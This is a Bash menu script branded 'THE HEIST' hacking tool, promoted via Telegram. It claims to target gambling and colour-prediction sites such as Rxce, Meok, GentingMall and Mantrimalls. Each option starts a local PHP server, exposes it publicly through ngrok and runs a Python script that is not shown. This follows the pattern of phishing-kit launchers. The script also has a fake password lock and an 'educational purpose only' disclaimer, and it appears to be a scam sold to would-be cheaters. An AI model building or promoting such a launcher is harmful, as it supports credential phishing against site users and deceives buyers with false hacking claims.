#!/bin/bash
##   THE HEIST 	:  	Hacking Tool
##   Author 	: 	MITHUN 
##   Version 	: 	2.2
##   TeleGram 	: 	@IDFCMONEY

##   THANKS TO :
##   Aditya Shakya - https://github.com/htr-tech


## If you Copy Then Give the credits :)



##                   GNU GENERAL PUBLIC LICENSE
##                    Version 3, 29 June 2007
##
##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
##    Everyone is permitted to copy and distribute verbatim copies
##    of this license document, but changing it is not allowed.
##
##                         Preamble
##
##    The GNU General Public License is a free, copyleft license for
##    software and other kinds of works.
##
##    The licenses for most software and other practical works are designed
##    to take away your freedom to share and change the works.  By contrast,
##    the GNU General Public License is intended to guarantee your freedom to
##    share and change all versions of a program--to make sure it remains free
##    software for all its users.  We, the Free Software Foundation, use the
##    GNU General Public License for most of our software; it applies also to
##    any other work released this way by its authors.  You can apply it to
##    your programs, too.
##
##    When we speak of free software, we are referring to freedom, not
##    price.  Our General Public Licenses are designed to make sure that you
##    have the freedom to distribute copies of free software (and charge for
##    them if you wish), that you receive source code or can get it if you
##    want it, that you can change the software or use pieces of it in new
##    free programs, and that you know you can do these things.
##
##    To protect your rights, we need to prevent others from denying you
##    these rights or asking you to surrender the rights.  Therefore, you have
##    certain responsibilities if you distribute copies of the software, or if
##    you modify it: responsibilities to respect the freedom of others.
##
##    For example, if you distribute copies of such a program, whether
##    gratis or for a fee, you must pass on to the recipients the same
##    freedoms that you received.  You must make sure that they, too, receive
##    or can get the source code.  And you must show them these terms so they
##    know their rights.
##
##    Developers that use the GNU GPL protect your rights with two steps:
##    (1) assert copyright on the software, and (2) offer you this License
##    giving you legal permission to copy, distribute and/or modify it.
##
##    For the developers' and authors' protection, the GPL clearly explains
##    that there is no warranty for this free software.  For both users' and
##    authors' sake, the GPL requires that modified versions be marked as
##    changed, so that their problems will not be attributed erroneously to
##    authors of previous versions.
##
##    Some devices are designed to deny users access to install or run
##    modified versions of the software inside them, although the manufacturer
##    can do so.  This is fundamentally incompatible with the aim of
##    protecting users' freedom to change the software.  The systematic
##    pattern of such abuse occurs in the area of products for individuals to
##    use, which is precisely where it is most unacceptable.  Therefore, we
##    have designed this version of the GPL to prohibit the practice for those
##    products.  If such problems arise substantially in other domains, we
##    stand ready to extend this provision to those domains in future versions
##    of the GPL, as needed to protect the freedom of users.
##
##    Finally, every program is threatened constantly by software patents.
##    States should not allow patents to restrict development and use of
##    software on general-purpose computers, but in those that do, we wish to
##    avoid the special danger that patents applied to a free program could
##    make it effectively proprietary.  To prevent this, the GPL assures that
##    patents cannot be used to render the program non-free.
##
##    The precise terms and conditions for copying, distribution and
##    modification follow.
##
##      Copyright (C) 2021  IDFCMONEY (https://github.com/ColonelIDFC)
##




### ANSI colors (FG & BG)###
RED="$(printf '\033[31m')"  
GREEN="$(printf '\033[32m')"  
ORANGE="$(printf '\033[33m')"  
BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  
CYAN="$(printf '\033[36m')"  
WHITE="$(printf '\033[37m')" 
BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  
GREENBG="$(printf '\033[42m')"  
Green="$(printf '\e[0;32m')" 
ORANGEBG="$(printf '\033[43m')"  
BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  
CYANBG="$(printf '\033[46m')"  
WHITEBG="$(printf '\033[47m')" 
BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"
Yellow="$(printf '\e[1;33m')"


## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
    exit 0
}
trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
    return
}

## Banner
banner() {
	cat <<- EOF
        ${WHITE}                         ${Green}                                     
        ${WHITE}████████╗██╗░░██╗███████╗${Green} ██╗░░██╗███████╗██╗░██████╗████████╗
        ${WHITE}╚══██╔══╝██║░░██║██╔════╝${Green} ██║░░██║██╔════╝██║██╔════╝╚══██╔══╝
        ${WHITE}░░░██║░░░███████║█████╗░░${Green} ███████║█████╗░░██║╚█████╗░░░░██║░░░
        ${WHITE}░░░██║░░░██╔══██║██╔══╝░░${Green} ██╔══██║██╔══╝░░██║░╚═══██╗░░░██║░░░
        ${WHITE}░░░██║░░░██║░░██║███████╗${Green} ██║░░██║███████╗██║██████╔╝░░░██║░░░
        ${WHITE}░░░╚═╝░░░╚═╝░░╚═╝╚══════╝${Green} ╚═╝░░╚═╝╚══════╝╚═╝╚═════╝░░░░╚═╝░░░${WHITE}
        ${WHITE}                         ${Green}                                     
        ${Yellow}████████████████████${RED}████████████████████${BLUE}████████████████████${WHITE}  
        ${Yellow}                                            
        ${Yellow}[${Green}Contact on TeleGram @IDFCMONEY ${Yellow}]
	EOF
}


## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}


## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}Author   ${RED}:  ${ORANGE}MITHUN ${RED}[ ${ORANGE}IDFC ${RED}]
		${GREEN}Social   ${RED}:  ${CYAN}https:/t.me/IDFCMONEY
${GREEN}Channel  ${RED}:  ${ORANGE}https://t.me/TheEraOfHacking
		${GREEN}Version  ${RED}:  ${ORANGE}2.2

		${REDBG}${WHITE} Thanks : HTR-TECH,Adi1090x,MoisesTapia,ThelinuxChoice
								  DarkSecDevelopers,Mustakim Ahmed,1RaY-1 ${RESETBG}

		${RED}Warning:${WHITE}
		${CYAN}This Tool is made for educational purpose only ${RED}!${WHITE}
		${CYAN}Author will not be responsible for any misuse of this toolkit ${RED}!${WHITE}

		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		99)
			msg_exit;;
		0 | 00 )
            main_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}
## Site RXCE
site_rxce() {
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 2
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  RXCE  TOOL NOW  STARTING   !     \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 2
                           clear
                           echo ""
                           echo ""
                           cat banner.txt
                           echo ""
                           echo ""
                           echo -e "\e[96m======================\e[91m THE TOOL IS LOCKED \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
                           read -p $'\e[1;40m\e[96m ENTER PASSWORD:\e[1;91m: \e[0m' option
                           echo ""
                           case $REPLY in 
                           1 | 01)
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Wait Verifing The Pass:\e[0m\e[1;77m %s\e[0m\n" Contact for Any help @IDFCMONEY                                   
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m';;
 

                           2 | 02)
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Wait Verifing The Pass :\e[0m\e[1;77m %s\e[0m\n" Contact for Any help @IDFCMONEY                                   
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > \e[0m'
                           python Tool4.py;;
                           		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid PASSWORD, Try Again..."
			{ sleep 1; site_rxce; };;
	esac
}


## Site MEOK
site_meok() {
                                                      echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 2
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  MEOK  TOOL NOW  STARTING   !     \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 2
                           clear
                           echo ""
                           echo ""
                           cat banner.txt
                           echo ""
                           echo ""
                           echo -e "\e[96m======================\e[91m THE TOOL IS LOCKED \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
                           read -p $'\e[1;40m\e[96m ENTER PASSWORD:\e[1;91m: \e[0m' option
                           echo ""
                           case $REPLY in 
                           1 | 01)
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Wait Verifing The Pass:\e[0m\e[1;77m %s\e[0m\n" Contact for Any help @IDFCMONEY                                   
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m';;

                           2 | 02)
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Wait Verifing The Pass :\e[0m\e[1;77m %s\e[0m\n" Contact for Any help @IDFCMONEY                                   
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > \e[0m'
                           python Tool4.py;;
                           		*)
			               echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			               { sleep 1; site_meok; };;
	esac
}

## Site Genting
site_genting() {
                                                      echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 2
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  MEOK  TOOL NOW  STARTING   !     \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 2
                           clear
                           echo ""
                           echo ""
                           cat banner.txt
                           echo ""
                           echo ""
                           echo -e "\e[96m======================\e[91m THE TOOL IS LOCKED \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
                           read -p $'\e[1;40m\e[96m ENTER PASSWORD:\e[1;91m: \e[0m' option
                           echo ""
                           case $REPLY in 
                           1 | 01)
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Wait Verifing The Pass:\e[0m\e[1;77m %s\e[0m\n" Contact for Any help @IDFCMONEY                                   
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m';;

                           2 | 02)
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Wait Verifing The Pass :\e[0m\e[1;77m %s\e[0m\n" Contact for Any help @IDFCMONEY                                   
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > \e[0m'
                           python Tool4.py;;
                           		*)
			               echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			               { sleep 1; site_genting; };;
	esac
}
## Site Mantri
site_mantri() {
                                                      echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 1
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  Mantri  TOOL NOW  STARTING !     \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 1
                           clear
                           echo ""
                           echo ""
                           cat banner.txt
                           echo ""
                           echo ""
                           echo -e "\e[96m======================\e[91m THE TOOL IS LOCKED \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
                           read -p $'\e[1;40m\e[96m ENTER PASSWORD:\e[1;91m: \e[0m' option
                           echo ""
                           case $REPLY in 
                           1 | 01)
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Wait Verifing The Pass:\e[0m\e[1;77m %s\e[0m\n" Contact for Any help @IDFCMONEY                                   
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m';;

                           2 | 02)
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Wait Verifing The Pass :\e[0m\e[1;77m %s\e[0m\n" Contact for Any help @IDFCMONEY                                   
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > \e[0m'
                           python Tool4.py;;
                           		*)
			               echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			               { sleep 1; site_mantri; };;
	esac
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner; }
	cat <<- EOF
      
       ${BLACKBG}${RED}Available Tools${RESETBG}

		${RED}[${WHITE}01${Green}]${BLUE} Rxce         ${Green}[${ORANGE}Popular!${RED}]
		${RED}[${WHITE}02${Green}]${BLUE} Meok         ${Green}[${ORANGE}High Win Rate${RED}]
		${RED}[${WHITE}03${Green}]${BLUE} GentingMall  ${Green}[${ORANGE}NEW!${RED}]
${RED}[${WHITE}04${Green}]${BLUE} Mantrimalls  ${Green}[${ORANGE}::${RED}]
            
EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} EnterPassCode : ${BLUE}"

	case $REPLY in 
		1 | 01)
			site_rxce;;
		2 | 02)
			site_meok;;
		3 | 03)
			site_genting;;
		4 | 04)
			site_mantri;;
		99)
			exit;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; tunnel_menu; };;
	esac
}


## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} Enter Tool Primary Password ${RED}[${WHITE}::${RED}]${ORANGE}


	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} ENTER PASSWORD : ${BLUE}"

	case $REPLY in 
		1 | 01)
			site_rxce;;
		2 | 02)
			site_meok;;
		3 | 03)
			site_genting;;
		4 | 04)
			site_mantri;;
		5 | 05)
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Password, Try Again..."
			{ sleep 1; main_menu; };;
	
	esac
}
##MAIN
main_menu




































